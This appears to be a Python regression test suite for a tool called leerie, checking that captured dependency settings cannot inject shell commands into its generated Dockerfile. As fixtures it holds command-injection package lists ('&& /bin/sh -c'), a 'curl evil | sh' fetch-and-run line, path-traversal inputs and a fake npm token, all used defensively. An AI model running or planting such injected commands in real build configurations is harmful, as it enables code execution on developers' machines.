"""A capture names packages and managers, never commands; and only the
operator applies one (DESIGN §6½ *A capture names packages and managers,
never commands*, *The operator applies a capture*; review round 28,
isolation E2).

Review round 28's E2 proof, turned around: a `dep_capture` answer holding
`setup_packages: ["libvips-dev", "&&", "/bin/sh", "-c", …]` and a
`language_installs` entry `{"manager": "make", "command": "make bootstrap;
echo r28 > /r28-run"}` was kept verbatim by `_filter_residual_deps`,
recorded, applied to the operator's `.leerie/config.toml` by the host's
EXIT trap, and turned by the next launch into an apt `RUN` holding `&& /bin/sh
-c …` and a `RUN make bootstrap; …`. Here each step refuses: the schema,
the filter, the recorder, the apply, the generator and the launcher's apt
layer; and nothing but `leerie config --apply-capture <run>` applies."""
from __future__ import annotations

import ast
import importlib.util
import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

from tests.config_arm_extract import extract_config_arm
from tests.conftest import run_git_repo_first as _git

REPO_ROOT = Path(__file__).resolve().parent.parent
LAUNCHER = REPO_ROOT / "leerie"
_PYBIN = str(Path(sys.executable).parent)


def _orch():
    spec = importlib.util.spec_from_file_location(
        "_leerie_capval", REPO_ROOT / "orchestrator" / "leerie.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


M = _orch()

HOSTILE_PKGS = ["libvips-dev", "&&", "/bin/sh", "-c",
                "echo$IFS'apt-word-ran'>/r28-apt"]
HOSTILE_INSTALL = {"manager": "make",
                   "command": "make bootstrap; echo r28 > /r28-run",
                   "copy_inputs": []}


def _generator_source() -> str:
    text = LAUNCHER.read_text()
    m = re.search(r"cat >\"\$_dep_pyf\" <<'PY'\n(.*?)\nPY\n", text, re.S)
    assert m, "the generator heredoc moved"
    return m.group(1)


# --- the table is one table -------------------------------------------------


def test_generator_table_is_the_orchestrators():
    tree = ast.parse(_generator_source())
    table = next(ast.literal_eval(n.value) for n in ast.walk(tree)
                 if isinstance(n, ast.Assign)
                 and getattr(n.targets[0], "id", None) == "_INSTALL_COMMANDS")
    assert table == M.BAKE_INSTALL_COMMANDS


# --- the schema --------------------------------------------------------------


def _schema_ok(value: dict) -> bool:
    jsonschema = pytest.importorskip("jsonschema")
    try:
        jsonschema.validate(value, M.SCHEMAS["dep_capture"])
    except jsonschema.ValidationError:
        return False
    return True


def test_schema_refuses_a_word_that_is_not_a_package():
    assert not _schema_ok({"setup_packages": HOSTILE_PKGS,
                           "language_installs": []})
    assert _schema_ok({"setup_packages": ["libvips-dev", "g++", "libc6.1"],
                       "language_installs": []})
    assert not _schema_ok({"setup_packages": [""], "language_installs": []})


def test_schema_refuses_an_input_that_is_not_a_relative_path():
    for ci in ("/etc/passwd", "a b", "x;y"):
        assert not _schema_ok({"setup_packages": [], "language_installs": [
            {"manager": "npm", "command": "npm ci", "copy_inputs": [ci]}]})


# --- the code ----------------------------------------------------------------


def test_filter_drops_a_manager_leerie_does_not_bake():
    assert M._filter_residual_deps([HOSTILE_INSTALL]) == []


def test_capture_problems_name_every_bad_item():
    probs = M._capture_problems(HOSTILE_PKGS, [HOSTILE_INSTALL, {
        "manager": "npm", "copy_inputs": ["../../etc/x", "ok/pkg.json"]}])
    text = "; ".join(probs)
    for word in ("'&&'", "'/bin/sh'", "'-c'", "'make'", "'../../etc/x'"):
        assert word in text, text
    assert "'libvips-dev'" not in text and "'ok/pkg.json'" not in text
    assert M._capture_problems(["libvips-dev"], [
        {"manager": "pnpm", "command": "x", "copy_inputs": ["a/b.json"]}]) \
        == []


def test_a_hostile_capture_is_never_recorded(tmp_path):
    M._record_capture(tmp_path, "run-x", HOSTILE_PKGS, [], False)
    M._record_capture(tmp_path, "run-x", [], [HOSTILE_INSTALL], False)
    assert not (tmp_path / M.CAPTURED_DEPS_FILE).exists()


def test_a_recorded_install_carries_leeries_command(tmp_path):
    M._record_capture(tmp_path, "run-x", ["libvips-dev"], [
        {"manager": "pnpm", "command": "pnpm i; curl evil | sh",
         "copy_inputs": ["pnpm-lock.yaml"]}], False)
    (entry,) = json.loads((tmp_path / M.CAPTURED_DEPS_FILE).read_text())
    assert entry["language_installs"] == [
        {"manager": "pnpm", "command": "pnpm install --frozen-lockfile",
         "copy_inputs": ["pnpm-lock.yaml"]}]


def _checkout(tmp_path: Path) -> Path:
    repo = tmp_path / "checkout"
    (repo / ".leerie").mkdir(parents=True)
    (repo / ".leerie" / "config.toml").write_text('build = "make"\n')
    return repo


def test_apply_refuses_a_hostile_file_and_keeps_it(tmp_path):
    repo, run = _checkout(tmp_path), tmp_path / "run"
    run.mkdir()
    (run / M.CAPTURED_DEPS_FILE).write_text(json.dumps([{
        "from_run": "x", "setup_packages": HOSTILE_PKGS,
        "language_installs": [HOSTILE_INSTALL], "replace": False}]))
    with pytest.raises(SystemExit):
        M.apply_captured_deps(run, repo)
    assert (repo / ".leerie" / "config.toml").read_text() == 'build = "make"\n'
    assert (run / M.CAPTURED_DEPS_FILE).exists()


def test_merge_refuses_a_hostile_capture(tmp_path):
    repo = _checkout(tmp_path)
    cfg = repo / ".leerie" / "config.toml"
    assert M._merge_capture_into_config(cfg, HOSTILE_PKGS,
                                        [HOSTILE_INSTALL], False) == {}
    assert cfg.read_text() == 'build = "make"\n'


def test_apply_logs_the_change_as_a_diff(tmp_path, capsys):
    repo, run = _checkout(tmp_path), tmp_path / "run"
    run.mkdir()
    (run / M.CAPTURED_DEPS_FILE).write_text(json.dumps([{
        "from_run": "x", "setup_packages": ["libvips-dev"],
        "language_installs": [], "replace": False}]))
    assert M.apply_captured_deps(run, repo) == 1
    cap = capsys.readouterr()
    assert '+setup_packages = "libvips-dev"' in cap.out + cap.err
    assert "setup_packages" in (repo / ".leerie" / "config.toml").read_text()


# --- the launcher -----------------------------------------------------------


def test_nothing_in_a_runs_exit_or_fetch_applies_a_capture():
    """The run's own exit paths name the capture; only `config
    --apply-capture` applies it (the E2 proof's auto-apply path)."""
    text = LAUNCHER.read_text()
    trap = next(l for l in text.splitlines() if "_bring_back_ran_run ||" in l
                and l.lstrip().startswith("trap "))
    assert "_note_ran_run_captures" in trap and "apply" not in trap
    assert "_apply_ran_run_captures" not in text
    calls = [l for l in text.splitlines()
             if "host_apply_captured_deps" in l
             and not l.lstrip().startswith("#")]
    assert len(calls) == 1 and calls[0].strip().startswith(
        'host_apply_captured_deps "$_leerie_state_dir/runs/$_ac_run"')
    for f in ("scripts/remote/fetch-branch.sh",
              "scripts/remote/ec2-fetch-branch.sh"):
        body = (REPO_ROOT / f).read_text()
        code = "\n".join(l for l in body.splitlines()
                         if not l.lstrip().startswith("#"))
        assert "host_apply_captured_deps" not in code, f
        assert "/work/.leerie/$_cap_file" not in code, f
        assert "--apply-capture" in body, f


def _config_arm(repo: Path, state: Path, args: list[str], tmp_path: Path
                ) -> subprocess.CompletedProcess:
    script = ("#!/usr/bin/env bash\nset -euo pipefail\n"
              'remote_log() { echo "[leerie] $*" >&2; }\n'
              'case "${1:-}" in\n' + extract_config_arm() + "\nesac\n")
    return subprocess.run(
        ["bash", "-c", script, "--", "config", *args],
        env={"PATH": f"{_PYBIN}:/usr/bin:/bin", "HOME": str(tmp_path),
             "USER_REPO": str(repo), "LEERIE_REPO": str(REPO_ROOT),
             "LEERIE_STATE_HOST_DIR": str(state)},
        capture_output=True, text=True, timeout=120)


def test_apply_capture_verb_applies_and_shows_the_diff(tmp_path):
    repo = _checkout(tmp_path)
    run = tmp_path / "state" / "runs" / "run-1"
    run.mkdir(parents=True)
    (run / M.CAPTURED_DEPS_FILE).write_text(json.dumps([{
        "from_run": "run-1", "setup_packages": ["libvips-dev"],
        "language_installs": [], "replace": False}]))
    r = _config_arm(repo, tmp_path / "state", ["--apply-capture", "run-1"],
                    tmp_path)
    assert r.returncode == 0, r.stderr
    assert '+setup_packages = "libvips-dev"' in r.stderr
    assert (run / M.CAPTURED_DEPS_APPLIED_FILE).exists()
    assert not (run / M.CAPTURED_DEPS_FILE).exists()


def test_apply_capture_verb_refuses_a_hostile_capture(tmp_path):
    repo = _checkout(tmp_path)
    run = tmp_path / "state" / "runs" / "run-1"
    run.mkdir(parents=True)
    (run / M.CAPTURED_DEPS_FILE).write_text(json.dumps([{
        "from_run": "run-1", "setup_packages": HOSTILE_PKGS,
        "language_installs": [], "replace": False}]))
    r = _config_arm(repo, tmp_path / "state", ["--apply-capture", "run-1"],
                    tmp_path)
    assert r.returncode == 1
    assert (repo / ".leerie" / "config.toml").read_text() == 'build = "make"\n'
    assert (run / M.CAPTURED_DEPS_FILE).exists()


@pytest.mark.parametrize("run_id", ["", "../x", "a/b", "..", "-x"])
def test_apply_capture_verb_takes_only_a_run_id(tmp_path, run_id):
    r = _config_arm(_checkout(tmp_path), tmp_path / "state",
                    ["--apply-capture", run_id], tmp_path)
    assert r.returncode == 1 and "Usage" in r.stderr


def _apt_layer(sp_value: str, tmp_path: Path) -> subprocess.CompletedProcess:
    """The launcher's setup_packages check and apt layer, extracted."""
    text = LAUNCHER.read_text()
    s = text.index('      _sp_packages="$(printf')
    e = text.index("      printf '    && rm -rf /var/lib/apt/lists/*\\n' >> "
                   '"$_gen_df_tmp"', s)
    script = ("set -euo pipefail\n"
              'remote_log() { echo "[leerie] $*" >&2; }\n'
              f'_sp={json.dumps(sp_value)}\n'
              f'_gen_df_tmp="{tmp_path}/Dockerfile.gen"\n'
              ': > "$_gen_df_tmp"\n' + text[s:e] + 'cat "$_gen_df_tmp"\n')
    return subprocess.run(["bash", "-c", script], capture_output=True,
                          text=True, cwd=str(tmp_path), timeout=30,
                          env={"PATH": "/usr/bin:/bin"})


def test_launcher_refuses_a_setup_package_that_is_shell(tmp_path):
    r = _apt_layer("libvips-dev && /bin/sh -c id", tmp_path)
    assert r.returncode == 1
    assert "'&&'" in r.stderr and "not a Debian package name" in r.stderr
    assert not (tmp_path / "Dockerfile.gen").exists()


def test_launcher_never_expands_a_package_word_as_a_glob(tmp_path):
    (tmp_path / "libfoo").write_text("")
    r = _apt_layer("lib*", tmp_path)
    assert r.returncode == 1 and "'lib*'" in r.stderr


def test_launcher_writes_plain_packages(tmp_path):
    r = _apt_layer("libvips-dev, fonts-noto", tmp_path)
    assert r.returncode == 0, r.stderr
    assert "    libvips-dev \\\n    fonts-noto \\\n" in r.stdout


# --- the generator: committed inputs, leerie's commands (A2 + E2) ----------


def _gen(repo: Path, tmp_path: Path) -> subprocess.CompletedProcess:
    src = tmp_path / "gen.py"
    src.write_text(_generator_source())
    return subprocess.run(
        [sys.executable, "-I", str(src), str(repo),
         str(repo / ".leerie" / "config.toml")],
        capture_output=True, text=True, timeout=60, cwd="/")


def _committed_repo(tmp_path: Path, files: dict[str, str]) -> Path:
    repo = tmp_path / "repo"
    (repo / ".leerie").mkdir(parents=True)
    _git(repo, "init", "-q")
    for rel, body in files.items():
        p = repo / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    _git(repo, "add", "-A")
    _git(repo, "-c", "user.email=a@b", "-c", "user.name=a", "commit", "-qm",
         "init")
    return repo


LOCK = ('{"name":"v","version":"1.0.0","lockfileVersion":3,"requires":true,'
        '"packages":{"":{"name":"v","version":"1.0.0"}}}')


def test_generator_runs_leeries_command_not_the_configs(tmp_path):
    repo = _committed_repo(tmp_path, {"pnpm-lock.yaml": "x",
                                      "package.json": "{}"})
    (repo / ".leerie" / "config.toml").write_text(
        "language_installs = '" + json.dumps([{
            "manager": "pnpm", "command": "pnpm i; curl evil | sh",
            "copy_inputs": ["pnpm-lock.yaml"]}]) + "'\n")
    r = _gen(repo, tmp_path)
    assert r.returncode == 0, r.stderr
    assert "RUN pnpm install --frozen-lockfile" in r.stdout
    assert "curl" not in r.stdout


@pytest.mark.parametrize("entry", [
    HOSTILE_INSTALL,
    {"manager": "npm", "command": "npm ci", "copy_inputs": ["../outside"]},
    {"manager": "npm", "command": "npm ci", "copy_inputs": ["/etc/passwd"]},
])
def test_generator_refuses_an_install_it_does_not_bake(tmp_path, entry):
    repo = _committed_repo(tmp_path, {"package.json": "{}"})
    (repo / ".leerie" / "config.toml").write_text(
        "language_installs = '" + json.dumps([entry]) + "'\n")
    r = _gen(repo, tmp_path)
    assert r.returncode != 0
    assert "RUN" not in r.stdout
    assert "language_installs" in r.stderr


def test_generator_reads_the_committed_tree_not_the_checkout(tmp_path):
    """A2 turned around: a committed `.npmrc` link to a file outside, and an
    untracked `.npmrc` in the working tree, are neither read nor copied;
    one linked to `/proc/self/pagemap` no longer stops the launch."""
    outside = tmp_path / "outside-npmrc"
    outside.write_text("//registry.npmjs.org/:_authToken=R28-SECRET\n")
    repo = _committed_repo(tmp_path, {"package-lock.json": LOCK,
                                      "package.json": '{"name":"v"}'})
    (repo / ".npmrc").symlink_to(outside)
    _git(repo, "add", ".npmrc")
    _git(repo, "-c", "user.email=a@b", "-c", "user.name=a", "commit", "-qm",
         "link")
    r = _gen(repo, tmp_path)
    assert r.returncode == 0, r.stderr
    assert ".npmrc" not in r.stdout and "RUN npm ci" in r.stdout
    (repo / ".npmrc").unlink()
    (repo / ".npmrc").symlink_to("/proc/self/pagemap")
    r = _gen(repo, tmp_path)
    assert r.returncode == 0, r.stderr
    _git(repo, "rm", "-q", "--cached", ".npmrc")
    (repo / ".npmrc").unlink()
    (repo / ".npmrc").write_text("untracked\n")
    (repo / "yarn.lock").write_text("untracked lockfile")
    r = _gen(repo, tmp_path)
    assert ".npmrc" not in r.stdout and "yarn" not in r.stdout


def test_generator_hashes_inputs_by_blob_id(tmp_path):
    repo = _committed_repo(tmp_path, {"package-lock.json": LOCK,
                                      "package.json": "{}"})
    blob = subprocess.run(["git", "-C", str(repo), "rev-parse",
                           "HEAD:package-lock.json"], capture_output=True,
                          text=True).stdout.strip()
    r = _gen(repo, tmp_path)
    assert f"package-lock.json={blob[:12]}" in r.stdout


def test_generator_finds_committed_workspace_manifests(tmp_path):
    repo = _committed_repo(tmp_path, {
        "pnpm-lock.yaml": "x", "package.json": "{}",
        "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n",
        "packages/a/package.json": "{}", "packages/b/c/package.json": "{}"})
    r = _gen(repo, tmp_path)
    assert "COPY packages/a/package.json ./packages/a/package.json" \
        in r.stdout
    assert "packages/b/c" not in r.stdout
